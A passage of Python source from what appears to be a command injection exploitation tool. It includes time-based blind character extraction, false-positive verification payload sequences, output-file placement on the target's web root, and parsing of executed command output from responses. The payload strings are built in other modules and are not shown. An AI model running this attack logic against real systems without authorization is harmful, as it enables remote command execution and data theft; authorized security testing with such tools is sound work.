      answered wrongly got fifteen.
      """
      if ascii_char is None and settings.ADJUST_TIME_DELAY_CHOICE != False:
        undelayed_retries = 0
        before_escalation = timesec
        while ascii_char is None and undelayed_retries < settings.MAX_LENGTH_REVALIDATIONS:
          undelayed_retries += 1
          settings.JITTER_SEEN = True
          settings.ADJUST_TIME_DELAY_DISABLED = True
          with timesec_lock:
            timesec = settings.CALIBRATED_TIMESEC = _escalated_delay(timesec)
            new_timesec = timesec
          warn_msg = "No delayed answer for this character. Increasing time delay to "
          warn_msg += str(new_timesec) + " second" + ("s" if new_timesec > 1 else "") + "."
          settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
          try:
            ascii_char, from_full_range = _bisect_chars(force_full=True)
          except KeyboardInterrupt:
            if threaded:
              raise
            checks.handle_exploitation_interrupt(filename, url)
        if ascii_char is None:
          conn_error_flag = True
          with timesec_lock:
            timesec = settings.CALIBRATED_TIMESEC = before_escalation

      if ascii_char is not None:
        # Re-probe with equality before accepting - one request when clean,
        # best-of-3 once jitter is seen.
        def _validate_char_boundary(candidate):
          if settings.JITTER_SEEN:
            votes = [_char_delayed(candidate, operator="-eq") for _ in range(3)]
            return votes.count(True) >= 2
          return _char_delayed(candidate, operator="-eq")

        revalidations = 0
        """
        The delay is shared by every worker, so what one of them raised another must not quietly put
        back: this remembers what this worker escalated to, and it only restores when that is still
        the value in force. Restoring regardless undid another worker's escalation mid-search, and
        with several workers the raise never stuck at all.
        """
        with timesec_lock:
          original_timesec = timesec
        my_escalation = None
        while True:
          try:
            validated = _validate_char_boundary(ascii_char)
          except KeyboardInterrupt:
            if threaded:
              raise
            checks.handle_exploitation_interrupt(filename, url)
            continue
          if validated:
            break
          if not from_full_range:
            # Re-search the full range before treating a narrowed-set miss as timing noise.
            ascii_char, from_full_range = _bisect_chars(force_full=True)
            if ascii_char is None:
              conn_error_flag = True
              break
            continue
          was_jittery = settings.JITTER_SEEN
          settings.JITTER_SEEN = True
          settings.ADJUST_TIME_DELAY_DISABLED = True
          max_revalidations = settings.MAX_LENGTH_REVALIDATIONS * (3 if was_jittery else 1)
          if revalidations >= max_revalidations:
            conn_error_flag = True
            with timesec_lock:
              if my_escalation is None or timesec == my_escalation:
                timesec = settings.CALIBRATED_TIMESEC = original_timesec
            break
          revalidations += 1
          settings.print_data_to_stdout(settings.print_error_msg("Invalid character detected. Retrying."))
          if settings.ADJUST_TIME_DELAY_CHOICE != False:
            with timesec_lock:
              timesec = settings.CALIBRATED_TIMESEC = _escalated_delay(timesec)
              new_timesec = my_escalation = timesec
            warn_msg = "Increasing time delay to " + str(new_timesec) + " second" + ("s" if new_timesec > 1 else "") + "."
            settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
          ascii_char, from_full_range = _bisect_chars(force_full=True)
          if ascii_char is None:
            conn_error_flag = True
            break
        _note_validation_result(revalidations > 0)

      if ascii_char is not None:
        with observed_chars_lock:
          observed_chars.add(ascii_char)
          observed_count[0] += 1
          char_frequency[ascii_char] = char_frequency.get(ascii_char, 0) + 1

      return ascii_char, conn_error_flag

    # Resolve the character at one position, on whichever shell the run is speaking.
    def _extract_position(num_of_chars):
      nonlocal timesec
      char_pool = checks.generate_char_pool(num_of_chars)

      if interpreter:
        # Alternative shells are still experimental.
        target = cmd if technique == settings.INJECTION_TECHNIQUE.TIME_BASED else OUTPUT_TEXTFILE

        # Whether the target waits, asked through an interpreter of its own.
        def _delayed(candidate, operator, local_timesec):
          payload = payloads.get_char_alter_interpreter(separator, target, num_of_chars, candidate, local_timesec, http_request_method, operator=operator)
          exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
          return checks.time_related_shell(exec_time, local_timesec)

        # The halving itself, over the ordinals the character can still be.
        def _bisect(local_timesec):
          lo, hi = min(char_pool) - 1, max(char_pool)
          while hi - lo > 1:
            mid = (lo + hi) // 2
            if _delayed(mid, "-le", local_timesec):
              lo = mid
            else:
              hi = mid
          return lo if lo >= min(char_pool) else None

        # Whether an ordinal is the answer: it must hold, and the next one up must not.
        def _boundary_holds(candidate, local_timesec):
          if not _delayed(candidate, "-le", local_timesec):
            return False
          if candidate + 1 <= max(char_pool) and _delayed(candidate + 1, "-le", local_timesec):
            return False
          return True

        # Ask again where the target's timing has been unsteady, and take the majority answer.
        def _validate(candidate, local_timesec):
          if settings.JITTER_SEEN:
            votes = [_boundary_holds(candidate, local_timesec) for _ in range(3)]
            holds = votes.count(True) >= 2
          else:
            holds = _boundary_holds(candidate, local_timesec) and _boundary_holds(candidate, local_timesec)
          return holds and _delayed(candidate, "-eq", local_timesec)

        revalidations = 0
        original_timesec = timesec
        candidate = _bisect(timesec)
        while True:
          try:
            validated = candidate is not None and _validate(candidate, timesec)
          except KeyboardInterrupt:
            checks.handle_exploitation_interrupt(filename, url)
            continue
          if validated:
            return num_of_chars, candidate, False
          was_jittery = settings.JITTER_SEEN
          settings.JITTER_SEEN = True
          settings.ADJUST_TIME_DELAY_DISABLED = True
          max_revalidations = settings.MAX_LENGTH_REVALIDATIONS * (3 if was_jittery else 1)
          if revalidations >= max_revalidations:
            with timesec_lock:
              timesec = settings.CALIBRATED_TIMESEC = original_timesec
            return num_of_chars, None, True
          revalidations += 1
          settings.print_data_to_stdout(settings.print_error_msg("Invalid character detected. Retrying."))
          if settings.ADJUST_TIME_DELAY_CHOICE != False:
            with timesec_lock:
              timesec = settings.CALIBRATED_TIMESEC = _escalated_delay(timesec)
          candidate = _bisect(timesec)

      # One bisection per position - the corruption check below catches systematic bias instead.
      ascii_char, conn_error_flag = _bisect_once(num_of_chars, char_pool)
      return num_of_chars, ascii_char, conn_error_flag

    positions = list(range(1, int(num_of_chars)))
    _load_partial_progress()
    positions_to_extract = [pos for pos in positions if pos not in results_by_position]
    conn_error_positions = set()
    # Asked once already in do_time_related_process(), before this ever runs.
    threaded = retrieval_concurrency() > 1
    if not threaded:
      remaining = positions_to_extract
      while remaining:
        try:
          for pos in remaining:
            _, ascii_char, conn_error_flag = _extract_position(pos)
            if ascii_char is None:
              failed_positions.add(pos)
            results_by_position[pos] = UNRESOLVED_POSITION if ascii_char is None else ascii_char
            if conn_error_flag:
              conn_error_positions.add(pos)
            _print_progress()
          remaining = []
        except SystemExit:
          _save_progress()
          raise
        except KeyboardInterrupt:
          # Defensive fallback - should already be absorbed inside _bisect_once()/_bisect_chars().
          _save_progress()
          checks.handle_exploitation_interrupt(filename, url)
          remaining = [pos for pos in positions_to_extract if results_by_position.get(pos) is None]
    else:
      # Extract positions concurrently - never more workers than positions to fill.
      remaining = positions_to_extract
      while remaining:
        num_workers = min(settings.THREADS, len(remaining)) or 1
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=num_workers)
        try:
          futures = {executor.submit(_extract_position, pos): pos for pos in remaining}
          for future in concurrent.futures.as_completed(futures):
            pos, ascii_char, conn_error_flag = future.result()
            if ascii_char is None:
              failed_positions.add(pos)
            results_by_position[pos] = UNRESOLVED_POSITION if ascii_char is None else ascii_char
            if conn_error_flag:
              conn_error_positions.add(pos)
            _print_progress()
        except SystemExit as exc:
          _save_progress()
          _abort_executor(executor, exc)
        except KeyboardInterrupt:
          # wait=True lets in-flight workers finish, so nothing races the retry below.
          executor.shutdown(wait=True, cancel_futures=True)
          _save_progress()
          checks.handle_exploitation_interrupt(filename, url)
          remaining = [pos for pos in positions_to_extract if results_by_position.get(pos) is None]
        else:
          executor.shutdown(wait=True)
          remaining = []
    # Assemble in position order; unresolved positions are dropped, not filled with a placeholder.
    for pos in positions:
      ascii_char = results_by_position.get(pos)
      if ascii_char is not None and ascii_char != UNRESOLVED_POSITION:
        output.append(chr(ascii_char))

    boundary_char = chr(max(settings.CHAR_POOL_MULTI))
    if output.count(boundary_char) >= 1 or conn_error_positions or lagging_detected:
      if threaded:
        warn_msg = "Concurrent (threaded) requests overloading the target may have corrupted the extracted data. Consider re-running with '--threads=1' to confirm it."
      else:
        warn_msg = "Connection instability with the target may have corrupted the extracted data. Consider re-running to confirm it."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

    if failed_positions:
      settings.INCOMPLETE_OUTPUT = True
      warn_msg = str(len(failed_positions)) + " of " + str(len(positions)) + " character"
      warn_msg += "s"[len(positions) == 1:] + " could not be extracted (no delay was ever observed for "
      warn_msg += ("them" if len(failed_positions) != 1 else "it") + ") - the retrieved output below is missing "
      warn_msg += ("those characters" if len(failed_positions) != 1 else "that character") + "."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

    check_end  = time.time()
    check_exec_time = int(check_end - check_start)
    output = "".join(str(p) for p in output)

    # Check for empty output.
    if output == (len(output) * settings.SINGLE_WHITESPACE):
      output = ""

  else:
    check_start = 0
    check_exec_time = 0
    output = ""

  return check_exec_time, output

"""
The main results-based command injection exploitation.
"""
def results_based_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique):

  # Send one payload and hand back what the target answered.
  def check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique):
    if technique == settings.INJECTION_TECHNIQUE.CLASSIC or technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
      from src.core.techniques.classic import cb_payloads as payloads
    elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
      from src.core.eval.payloads import classic as payloads
    else:
      payloads = checks.file_based_payloads()

    if interpreter:
      if technique != settings.INJECTION_TECHNIQUE.FILE_BASED and technique != settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
        payload = payloads.cmd_execution_alter_interpreter(separator, TAG, cmd)
      else:
        payload = payloads.cmd_execution_alter_interpreter(separator, cmd, OUTPUT_TEXTFILE)
    else:
      if technique != settings.INJECTION_TECHNIQUE.FILE_BASED and technique != settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
        payload = payloads.cmd_execution(separator, TAG, cmd)
      else:
        payload = payloads.cmd_execution(separator, cmd, OUTPUT_TEXTFILE)
    if settings.VERBOSITY_LEVEL != 0:
      _ = cmd
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
        payload_msg = payload
        if settings.COMMENT in payload_msg:
          payload = payload.split(settings.COMMENT)[0].strip()
          payload_msg = payload_msg.split(settings.COMMENT)[0].strip()
        if settings.COMMENT in cmd:  
          _ = cmd.split(settings.COMMENT)[0].strip()
      # The trace of what is actually being run, which for an internal command is the only word of
      # it - but a command the user asked for on the command line has just been named already.
      if _ != menu.options.os_cmd:
        debug_msg = "Executing the '" + _ + "' command."
        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    response, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
    return response

  response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique)
  
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC or technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    tries = 0
    # A request that keeps failing outright is not the file-based technique's boundary budget, so
    # it does not wait on '--failed-tries' being settled to know how many times to try again.
    max_tries = int(menu.options.failed_tries or settings.MAX_RETRIES) / 2
    while not response:
      if tries < max_tries:
        response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique)
        tries = tries + 1
      else:
        err_msg = "Something went wrong. The request has failed (" + str(tries) + ") times in a row."
        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
        raise SystemExit()

  return response


"""
False-positive check and evaluation.
"""
def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, interpreter, exec_time, url_time_response, false_positive_warning, technique, retry_attempt=None, retry_total=None, silent=False):

  payloads = execution.select_payloads_module(technique)

  # silent=True skips the detection-phase chatter for a resume re-verify.
  if not silent:
    checks.check_for_false_positive_result(false_positive_warning)

  # Varying the sleep time.
  if false_positive_warning:
    timesec = timesec + random.randint(3, 5)

  # Verify the oracle with known logical properties; any failed relationship invalidates the round.
  if not interpreter:
    a, c, b = sorted(random.sample(range(1, 50), 3))
    # End on a must-delay check; the caller re-validates the final exec_time.
    if settings.TARGET_OS == settings.OS.WINDOWS:
      litmus_checks = [
        (payloads.windows_condition_check(separator, str(a) + "-" + str(a), 0, timesec), True),
        (payloads.windows_condition_check(separator, str(a) + "-" + str(c), 0, timesec), None),  # discarded - lets the backend settle after any earlier delay
        (payloads.windows_condition_check(separator, str(a) + "-" + str(b), 0, timesec), False),
        (payloads.windows_condition_check(separator, str(b) + "-" + str(c), 0, timesec), False),
        (payloads.windows_condition_check(separator, "1-1", 999999, timesec), False),  # deliberate mismatch
        (payloads.windows_condition_check(separator, str(c) + "-" + str(c), 0, timesec), True),
      ]
    else:
      litmus_checks = [
        (payloads.condition_check(separator, str(a) + " -eq " + str(a), timesec, http_request_method), True),
        (payloads.condition_check(separator, str(a) + " -eq " + str(c), timesec, http_request_method), None),  # discarded - lets the backend settle after any earlier delay
        (payloads.condition_check(separator, str(a) + " -eq " + str(b), timesec, http_request_method), False),
        (payloads.condition_check(separator, str(b) + " -eq " + str(c), timesec, http_request_method), False),
        (payloads.condition_check(separator, str(b) + " " + str(c), timesec, http_request_method), False),  # not a valid test expression
        (payloads.condition_check(separator, str(c) + " -eq " + str(c), timesec, http_request_method), True),
      ]
    verified = True
    for payload, expect in litmus_checks:
      if payload is None:
        verified = False
        break
      if not silent and settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(".")
      before = stability.requests_sent()
      exec_time, vuln_parameter, _, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
      if stability.request_was_retried(before):
        verified = False
        break
      delayed = checks.time_related_shell(exec_time, timesec)
      if not delayed:
        checks.record_probe_response_time(exec_time)
      if expect is not None and delayed != expect:
        verified = False
        break

    if verified:
      if not silent and settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(" (done)")
      return exec_time, str(randvcalc)
    else:
      if not silent:
        checks.unexploitable_point(retry_attempt, retry_total)
      return exec_time, ""

  # Only the interpreter path reaches here - the check above answers for every other one, and its
  # oracle is an exact match rather than the logical relationships used there.
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd, previous_cmd = execution.windows_transform_cmd(cmd, technique, interpreter)

  output_length = 1
  if not silent and settings.VERBOSITY_LEVEL == 0:
    settings.print_data_to_stdout(".")
  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    payload = payloads.cmd_execution_alter_interpreter(separator, cmd, output_length, timesec, http_request_method)
  else:
    payload = payloads.cmd_execution_alter_interpreter(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)

  # Ask again, and only believe a finding that answers the same way every time.
  def _retry_confirm(payload):
    nonlocal exec_time, vuln_parameter, prefix, suffix
    consecutive_hits = 0
    for attempt in range(settings.FALSE_POSITIVE_RETRIES):
      before = stability.requests_sent()
      exec_time, vuln_parameter, _, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
      if stability.request_was_retried(before):
        continue
      if checks.time_related_shell(exec_time, timesec):
        consecutive_hits += 1
        # Let the backend's own cooldown pass before trusting the next timing read.
        time.sleep(timesec)
        if consecutive_hits >= 2:
          return True
      else:
        consecutive_hits = 0
        checks.record_probe_response_time(exec_time)
    return False

  found_chars = _retry_confirm(payload)

  if found_chars:
    if settings.TARGET_OS == settings.OS.WINDOWS:
      cmd = previous_cmd

    output = []
    # The verified value is always in 1-7 (see handler.py's randv1/randv2 ranges).
    for ascii_char in range(1, 8):
      if not silent and settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(".")
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        payload = payloads.fp_result_alter_interpreter(separator, cmd, 1, ascii_char, timesec, http_request_method)
      else:
        payload = payloads.fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, 1, ascii_char, timesec, http_request_method)
      if _retry_confirm(payload):
        output.append(ascii_char)
        break

    output = "".join(str(p) for p in output)

    if str(output) == str(randvcalc):
      if not silent and settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(" (done)")
      return exec_time, output
    else:
      if not silent:
        checks.unexploitable_point(retry_attempt, retry_total)
      return exec_time, ""

  else:
    if not silent:
      checks.unexploitable_point(retry_attempt, retry_total)
    return exec_time, ""

"""
Get the command output filename, skipping the prompt when resuming.
"""
def select_output_filename(technique, tmp_path, TAG, prompt=True):
  # Ensure tmp_path is safe to concatenate.
  tmp_path = checks.normalize_target_dir(tmp_path)

  # If a custom filename is already set, handle tmp_path prefix depending on technique
  if settings.CUSTOM_FILENAME:
    if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
      if not settings.CUSTOM_FILENAME.startswith(tmp_path):
        settings.CUSTOM_FILENAME = tmp_path + settings.CUSTOM_FILENAME
    else:
      # Remove tmp_path prefix if present but technique is different
      if settings.CUSTOM_FILENAME.startswith(tmp_path):
        settings.CUSTOM_FILENAME = settings.CUSTOM_FILENAME[len(tmp_path):]
    return settings.CUSTOM_FILENAME

  # Generate default filename
  OUTPUT_TEXTFILE = TAG + settings.OUTPUT_FILE_EXT

  while prompt:
    message = "Do you want to use a random file '" + OUTPUT_TEXTFILE 
    message += "' to receive the execution output? [Y/n] "
    procced_option = common.read_input(message, default="Y", check_batch=True)

    if procced_option in settings.CHOICE_YES:
      break

    elif procced_option in settings.CHOICE_NO:
      message = "Enter a filename to receive the execution output "
      message = common.read_input(message, default=OUTPUT_TEXTFILE, check_batch=True)

      OUTPUT_TEXTFILE = message
      info_msg = "Using '" + OUTPUT_TEXTFILE + "' for execution output."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      break

    elif procced_option in settings.CHOICE_QUIT:
      raise SystemExit()

    else:
      common.invalid_option(procced_option)

  # Prepend tmp_path if needed
  if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
    OUTPUT_TEXTFILE = tmp_path + OUTPUT_TEXTFILE

  settings.CUSTOM_FILENAME = OUTPUT_TEXTFILE
  return OUTPUT_TEXTFILE

"""
Find the URL directory.
"""
def injection_output(url, OUTPUT_TEXTFILE, timesec, technique):

  # The document root the target's own URL implies, where none was given.
  def custom_web_root(url, OUTPUT_TEXTFILE):
    path = _urllib.parse.urlparse(url).path
    if path.endswith('/'):
      # Contract again the url.
      scheme = _urllib.parse.urlparse(url).scheme
      netloc = _urllib.parse.urlparse(url).netloc
      output = scheme + "://" + netloc + path + OUTPUT_TEXTFILE
    else:
      try:
        path_parts = [non_empty for non_empty in path.split('/') if non_empty]
        count = 0
        for part in path_parts:
          count = count + 1
        count = count - 1
        last_param = path_parts[count]
        output = url.replace(last_param, OUTPUT_TEXTFILE)
        if "?" and settings.OUTPUT_FILE_EXT in output:
          try:
            output = output.split("?")[0]
          except (Exception, SystemExit):
            pass
      except IndexError:
        output = url + "/" + OUTPUT_TEXTFILE
    settings.DEFINED_WEBROOT = output
    return output

  if not settings.DEFINED_WEBROOT or settings.MULTI_TARGETS or not settings.RECHECK_FILE_FOR_EXTRACTION:
    if menu.options.web_root:
      scheme = _urllib.parse.urlparse(url).scheme
      netloc = _urllib.parse.urlparse(url).netloc
      output = scheme + "://" + netloc + "/" + OUTPUT_TEXTFILE
      if not settings.DEFINED_WEBROOT or (settings.MULTI_TARGETS and not settings.RECHECK_FILE_FOR_EXTRACTION):
        if settings.MULTI_TARGETS:
          settings.RECHECK_FILE_FOR_EXTRACTION = True
        while True:
          message =  "Do you want to use the URL '" + output
          message += "' to receive the execution output? [Y/n] "
          procced_option = common.read_input(message, default="Y", check_batch=True)
          if procced_option in settings.CHOICE_YES:
            settings.DEFINED_WEBROOT = output
            break
          elif procced_option in settings.CHOICE_NO:
            message =  "Enter URL to receive "
            message += "the execution output "
            message = common.read_input(message, default=output, check_batch=True)
            if not re.search(r'^(?:http)s?://', message, re.I):
              common.invalid_option(message)
              pass
            else:
              output = settings.DEFINED_WEBROOT = message
              info_msg = "Using '" + output
              info_msg += "' for execution output."
              settings.print_data_to_stdout(settings.print_info_msg(info_msg))
              settings.RECHECK_FILE_FOR_EXTRACTION = True
              if not settings.DEFINED_WEBROOT:
                pass
              else:
                break
          elif procced_option in settings.CHOICE_QUIT:
            raise SystemExit()
          else:
            common.invalid_option(procced_option)
            pass
    else:
        output = custom_web_root(url, OUTPUT_TEXTFILE)
  else:
    output = settings.DEFINED_WEBROOT

  # Announced once: the same URL is requested again for every separator tried.
  if settings.VERBOSITY_LEVEL != 0 and output != settings.LAST_ANNOUNCED_OUTPUT_FILE:
    settings.LAST_ANNOUNCED_OUTPUT_FILE = output
    debug_msg = "Expecting the command execution output at '" + output + "'."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

  return output

"""
Evaluate test results.
"""
def injection_test_results(response, TAG, randvcalc, technique, payload=None):
  if type(response) is bool and response != True or response is None:
    return False

  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    try:
      import html
      unescape = html.unescape
    except:  # Python 2
      unescape = _html_parser.HTMLParser().unescape
    # Check the execution results
    html_data = checks.process_page_content(response, action="decode")
    html_data = html_data.replace(settings.END_LINE.LF,settings.SINGLE_WHITESPACE)
    # cleanup string / unescape html to string
    html_data = _urllib.parse.unquote(html_data)
    html_data = unescape(html_data)
    # Replace non-ASCII characters with a single space
    re.sub(r"[^\x00-\x7f]",r" ", html_data)
    html_data = checks.remove_reflected_values(html_data, payload)
    if settings.SKIP_CALC:
      shell = re.findall(r"" + TAG + TAG + TAG, html_data)
    else:
      shell = re.findall(r"" + TAG + str(randvcalc) + TAG  + TAG, html_data)
    if len(shell) > 1:
      shell = shell[0]
  else:
    html_data = checks.process_page_content(response, action="decode")
    # A Windows target ends its lines with CRLF, so every line break counts as the one whitespace
    # the markers are looked up with.
    html_data = re.sub(r"[" + settings.END_LINE.CR + settings.END_LINE.LF + r"]+", settings.SINGLE_WHITESPACE, html_data)
    html_data = checks.remove_reflected_values(html_data, payload)
    if settings.SKIP_CALC:
      shell = re.findall(r"" + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE , html_data)
    else:
      shell = re.findall(r"" + TAG + settings.SINGLE_WHITESPACE + str(randvcalc) + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE , html_data)

  return shell

"""
Command execution results.
"""
def injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec):

  if technique == settings.INJECTION_TECHNIQUE.CLASSIC or technique == settings.INJECTION_TECHNIQUE.TIME_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
    try:
      import html
      unescape = html.unescape
    except:  # Python 2
      unescape = _html_parser.HTMLParser().unescape
    false_result = False
    try:
      # Grab execution results
      html_data = checks.process_page_content(response, action="decode")
      """
      Every line break stood in for, rather than thrown away.

      The markers are looked for on a single line, so the breaks have to come out of the way first -
      but a command's output is its own lines as much as its own characters, and replacing them with
      spaces hands back a paragraph where the target answered a list. Marked here and put back once
      what is between the markers has been taken, the way the evaluation sink below already does it.
      """
      new_line = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
      html_data = re.sub(settings.END_LINE.CRLF + r"|[" + settings.END_LINE.CR + settings.END_LINE.LF + r"]", new_line, html_data)
      # cleanup string / unescape html to string
      html_data = _urllib.parse.unquote(html_data)
      html_data = unescape(html_data)
      # Replace non-ASCII characters with a single space
      re.sub(r"[^\x00-\x7f]",r" ", html_data)
      shell = re.findall(r"" + TAG + TAG + "(.*)" + TAG + TAG + settings.SINGLE_WHITESPACE, html_data)
      if not shell:
        shell = re.findall(r"" + TAG + TAG + "(.*)" + TAG + TAG + "", html_data)
      if not shell:
        return shell
      try:
        if TAG in shell:
          shell = re.findall(r"" + "(.*)" + TAG + TAG, shell)
        # Clear junks
        shell = [tags.replace(TAG + TAG , settings.SINGLE_WHITESPACE) for tags in shell]
        shell = [backslash.replace(r"\/","/") for backslash in shell]
        # The output's own line breaks, back where they were.
        shell = [marked.replace(new_line, settings.END_LINE.LF) for marked in shell]
      except UnicodeDecodeError:
        pass
      if settings.TARGET_OS == settings.OS.WINDOWS:
        if menu.options.interpreter:
          shell = [right_space.rstrip() for right_space in shell]
          shell = [left_space.lstrip() for left_space in shell]
          if "<<<<" in shell[0]:
            false_result = True
        else:
          if shell[0] == "%i" :
            false_result = True
    except (AttributeError, TypeError):
      false_result = True
    if false_result:
      shell = ""

  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    new_line = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
    # Grab execution results
    html_data = checks.process_page_content(response, action="decode")
    # CRLF included, so a Windows target's line breaks are marked the same as a Unix one's.
    html_data = re.sub(settings.END_LINE.CRLF + r"|[" + settings.END_LINE.CR + settings.END_LINE.LF + r"]", new_line, html_data)
    shell = re.findall(r"" + TAG + new_line + TAG + "(.*)" + TAG + new_line + TAG + "", html_data)
    try:
      if len(re.split(TAG  + "(.*)" + TAG, shell[0])) != 0:
        shell = re.findall(r"" + new_line + "(.*)" + new_line + "", \
                           re.split(TAG  + "(.*)" + TAG, \
                           re.split(TAG  + "(.*)" + TAG, shell[0])[0])[0])
      shell = shell[0].replace(new_line, settings.END_LINE.LF).rstrip().lstrip()
    except IndexError:
      pass

  else:
    #Find the directory.
    output = injection_output(url, OUTPUT_TEXTFILE, timesec, technique)
    try:
      response = checks.get_response(output)
      if type(response) is bool and response != True or response is None:
        shell = ""
      else:
        shell = checks.process_page_content(response, action="encode").rstrip().lstrip()
        if settings.TARGET_OS == settings.OS.WINDOWS:
          shell = [newline.replace(settings.END_LINE.CR, "") for newline in shell]
          shell = [empty for empty in shell if empty]
    except (_urllib.error.HTTPError, _urllib.error.URLError) as e:
      if str(e.getcode()) == settings.NOT_FOUND_ERROR:
        shell = ""

  return shell
# eof
